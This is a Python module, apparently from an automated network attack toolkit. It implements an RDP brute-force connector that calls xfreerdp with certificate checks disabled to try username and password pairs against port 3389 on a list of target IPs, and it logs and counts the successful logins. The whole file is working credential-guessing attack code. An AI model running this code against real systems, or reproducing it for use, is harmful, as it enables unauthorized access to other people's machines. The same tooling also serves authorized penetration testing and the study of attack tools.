import os
import csv
import subprocess
import threading
import logging
import time
from queue import Queue
from shared import SharedData
from logger import Logger
from actions.base_connector import BaseConnector, BaseBruteforce

logger = Logger(name="rdp_connector.py", level=logging.DEBUG)

b_class = "RDPBruteforce"
b_module = "rdp_connector"
b_status = "brute_force_rdp"
b_port = 3389
b_parent = None

class RDPBruteforce(BaseBruteforce):
    def __init__(self, shared_data):
        super().__init__(shared_data, RDPConnector(shared_data))

class RDPConnector(BaseConnector):
    PORT = 3389
    SERVICE_NAME = "RDP"

    @property
    def output_file(self):
        return self.shared_data.rdpfile

    def connect(self, ip, user, password):
        import re
        if not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', ip):
            raise ValueError("Invalid IP address format")
        if not user or '\n' in user or '\r' in user:
            raise ValueError("Invalid username")
        if not password or '\n' in password or '\r' in password:
            raise ValueError("Invalid password")
        cmd = ['xfreerdp', f'/v:{ip}', f'/u:{user}', f'/p:{password}', '/cert:ignore', '+auth-only']
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate(timeout=30)
            return process.returncode == 0
        except subprocess.SubprocessError:
            return False

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        rdp_bruteforce = RDPBruteforce(shared_data)
        logger.info("Démarrage de l'attaque RDP... sur le port 3389")
        ips_to_scan = shared_data.read_data()
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing RDPBruteforce on {ip}...")
            rdp_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Nombre total de succès: {len(rdp_bruteforce.connector.results)}")
        exit(len(rdp_bruteforce.connector.results))
    except Exception as e:
        logger.error(f"Erreur: {e}")
